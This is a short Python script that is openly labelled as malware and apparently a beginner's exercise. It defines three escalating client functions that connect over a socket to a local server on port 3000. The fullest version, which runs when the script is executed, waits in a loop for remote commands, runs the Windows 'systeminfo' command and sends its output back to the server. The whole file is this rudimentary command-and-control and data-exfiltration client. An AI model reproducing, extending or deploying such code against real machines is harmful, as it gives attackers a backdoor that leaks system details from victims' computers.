import socket
import os

def create_plain_malware(port= 3000):
    s = socket.socket()
    s.connect(('127.0.0.1', port))
    print(s.recv(3000).decode())
    s.close()

def create_mid_malware(port= 3000):
    s = socket.socket()
    s.connect(('127.0.0.1', port))
    sysinfo =  os.popen("systeminfo").read().split('\n')
    data = ''
    for item in sysinfo:
        data += str(item.split("\r"))
    data_bytes = bytes(data, 'utf-8')
    s.sendall(data_bytes)
    print(f"Got data from server: {s.recv(1024).decode()}")
    s.close()

def create_full_malware(port= 3000):
    s = socket.socket()
    s.connect(('127.0.0.1', port))
    while True:
        option = s.recv(1024).decode()
        if option == 'sysinfo' or option == '1':
            sysinfo =  os.popen("systeminfo").read().split('\n')
            data = ''
            for item in sysinfo:
                data += str(item.split("\r"))
            data_bytes = bytes(data, 'utf-8')
            s.sendall(data_bytes)
            print(f"Got data from server: {s.recv(1024).decode()}")
        elif option == 'close' or option == '2':
            print('Closing connection...')
            break
    s.close()

create_full_malware()